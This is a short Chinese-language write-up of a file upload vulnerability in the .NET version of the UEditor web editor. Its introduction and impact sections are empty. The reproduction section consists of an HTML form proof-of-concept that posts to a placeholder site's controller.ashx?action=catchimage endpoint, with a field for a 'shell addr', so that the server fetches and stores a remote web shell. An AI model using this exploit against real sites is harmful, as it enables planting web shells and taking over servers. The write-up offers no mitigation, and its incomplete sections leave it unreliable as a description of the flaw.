ueditor .net版本上传漏洞
========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

本地上传poc

    <form action="http://www.xxxxx.com/ueditor/net/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
    shell addr: <input type="text" name="source[]" />
     <input type="submit" value="Submit" />
    </form>

上传文件名为 1
